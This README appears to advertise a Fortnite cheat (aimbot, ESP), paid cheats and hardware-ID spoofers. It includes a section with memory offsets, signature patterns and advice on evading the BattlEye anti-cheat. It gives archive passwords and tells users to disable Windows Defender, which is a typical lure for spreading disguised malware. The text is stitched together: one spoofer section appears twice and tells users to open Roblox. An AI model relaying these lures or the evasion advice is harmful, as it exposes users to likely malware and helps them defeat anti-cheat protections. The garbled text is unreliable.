# WinRar Password: kol2233

Some users were not able to start the software because of windows defender, so make sure to turn it off.

Make sure to leave a star if this repository helped you!


## Fortnite External
![CSS](https://img.shields.io/badge/-CSS-05122A?style=for-the-badge&logo=CSS3&logoColor=1572B6)&nbsp;
![VSCode](https://img.shields.io/badge/-Visual_Studio_Code-05122A?style=for-the-badge&logo=VisualStudioCode)&nbsp;
![GitHub](https://img.shields.io/badge/-GitHub-05122A?style=for-the-badge&logo=github)&nbsp;
![Git](https://img.shields.io/badge/-Git-05122A?style=for-the-badge&logo=git)&nbsp;

### 📁 〢Setup
- Scroll down to the bottom
- It works the same way as the Valorant External, which requires you to `Create your own drivers.`
- Drivers available are Kernel only, Ask me other Question [Discord Server](https://discord.gg/MBTkVcJefp)


### 📮 〢 Driver
- The only available driver is Kernel because it doesn't support EFI. 
- This is the free version. Use at your own risk.
- Scroll down the message if you need help

### Feature List

### Aimbot
- Head , Body , etc
- Custom Hotkey 
- Aim Smooth 
- Silent Aim (70% not safe)

### ESP
- 3D Bounding Box
- Corner Box
- Basic Box
- Snaplines
- Skeletons
- Distance
- Current Eqipped Weapon (Ammo Count, Reloading Check)
- Platform (in progress)
- Max Distance

### Misc
- Save & Load Config


---

  <p align="center">
    <a href="https://discord.com/users/943374631644045363">
        <img title="Fnoberz server discord" alt="Fnoberz's discord" src="https://discord.c99.nl/widget/theme-4/943374631644045363.png"/>
    </a>
</p> 
 
### 💬Discord ・[UNFAIR OFFICIAL](https://discord.gg/MBTkVcJefp) 

### 🛒〢 Private Cheat.
`PRIVATE CHEATING | SPOOFER | SOURCE CODE | DRIVER | ETC`
#### Read more details here. [Information](https://github.com/Cloud-Official/Product) 

- Lifetime
- Legit and Safe
- It is safe and can be played on the main account
- Choose the features you want, for example Aimbot + Esp


### 🔱〢 Warranty Product.

- Support 24 Hr
- Update Free
- If Banned = Refund

---

A website that I created to introduce myself from start to finish. hope you like it [Fnoberz.com](https://fnoberz.com/)

<h2 align="center"> IMGUI BASIC 

***

https://user-images.githubusercontent.com/94861415/179345884-75769805-4197-4557-a0a8-4d473b99312a.mp4


![fn fnober](https://user-images.githubusercontent.com/94861415/192077908-f8980c78-a028-4b90-bd14-5413595bf96e.png)
![fas](https://user-images.githubusercontent.com/94861415/192078096-e5e5ec51-ab4b-4042-9c88-76e15bfde2e2.png)

![support](https://user-images.githubusercontent.com/94861415/194168886-cd634caf-524c-4d8e-bba1-91e252e0b473.png)


***


<h2 align="center"> Copyright © 2021 - 2022


##### <p align="center">  FNOBERZ OFFICIAL / JOIN DISCORD [CLOUD PROJECT](https://discord.gg/JUwFCGHbV4)

# FortUpdater
This class will help you to find the new offsets, on every update.
It can be implemented in cheats to make them auto-updating.
The only thing you must do is add Pattern Scan for the only 4 needed offsets.
ALL PATTERNS ARE IN THE EXAMPLE ON *HOW TO USE*

Security info
---------------
In this release i don't use Return Address's spoof.
You must implement a spoofer to "GetObjectName" and "GetNameByIndex" funcs to be UNDETECTED for a long time.
You must also use an alternative to IsBadReadPtr since it is DETECTED on BattlEye

HOW TO USE
---------------
Just initialize the class and then search for your needed offset!
```
uintptr_t UObjectArray = (base_address + 0x7EC0F00);
uintptr_t GetObjectName = (base_address + 0x4114470);
uintptr_t GetNameByIndex = (base_address + 0x2B713B0);
uintptr_t FnFree = (base_address + 0x2A6E690);

FortUpdater* Updater = new FortUpdater();
if (Updater->Init(UObjectArray, GetObjectName, GetNameByIndex, FnFree))
{
  Offsets.Levels = Updater->FindOffset("World", "Levels");
  Offsets.OwningGameInstance = Updater->FindOffset("World", "OwningGameInstance");
  Offsets.PlayerCameraManager = Updater->FindOffset("PlayerController", "PlayerCameraManager");
  Offsets.AcknowledgedPawn = Updater->FindOffset("PlayerController", "AcknowledgedPawn");
}
```

These are the current patterns for the 4 needed offsets.
```
UObjectArray: 49 63 C8 48 8D 14 40 48 8B 05 ? ? ? ? 48 8B 0C C8 48 8D 04 D1 (+10)
GetObjectName: 40 53 48 83 EC 20 48 8B D9 48 85 D2 75 45 33 C0 48 89 01 48 89 41 08 8D 50 05 E8 ? ? ? ? 8B 53 08 8D 42 05 89 43 08 3B 43 0C 7E 08 48 8B CB E8 ? ? ? ? 48 8B 0B 48 8D 15 ? ? ? ? 41 B8 ? ? ? ? E8 ? ? ? ? 48 8B C3 48 83 C4 20 5B C3 48 8B 42 18
GetNameByIndex: 48 89 5C 24 ? 55 56 57 48 8B EC 48 83 EC 30 8B    ||   can be found also inside GetObjectName's function.
FnFree: 48 85 C9 74 2E 53
```

INFO
---------------
If someone is asking how much time it require for each offset:
Every offset search, for me took about 250µs (microsecond) (0,250ms)

###  Atlas Fortnite Spoofer

# WinRar Password: dope7859

### How to use?

- Run a cheat after extracting files, then open a game.

- Open Roblox and Press F4.

### Features:

- Best Cleaner

- Undetected Method

- Instant Unban

- HWID Unban
###  Atlas Fortnite Spoofer

### Password to extract files: 2233

### How to use?

- Run a cheat after extracting files, then open a game.

- Open Roblox and Press F4.

### Features:

- Best Cleaner

- Undetected Method

- Instant Unban

- HWID Unban